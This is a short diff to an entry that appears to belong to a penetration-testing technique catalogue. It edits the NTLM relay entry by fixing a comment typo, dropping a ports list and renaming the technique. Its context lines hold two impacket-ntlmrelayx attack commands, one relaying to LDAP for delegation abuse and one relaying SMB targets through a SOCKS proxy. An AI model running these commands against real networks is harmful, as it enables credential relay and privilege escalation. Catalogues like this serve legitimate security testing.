@@ -12,7 +12,7 @@ command: |
   # Relay to LDAP for delegation abuse
   impacket-ntlmrelayx -t ldap://10.10.10.1 --delegate-access
 
-  # Relay with SOCKs proxy
+  # Relay with SOCKS proxy
   impacket-ntlmrelayx -tf targets.txt -smb2support -socks
 phase:
   - Exploitation
@@ -23,13 +23,10 @@ services:
   - NTLM
   - SMB
   - LDAP
-ports:
-  - "445"
-  - "389"
 items:
   - No_Creds
 techniques:
-  - NTLM_Relay
+  - NTLM_Relay_Poisoning
 network_position:
   - Internal
 references:
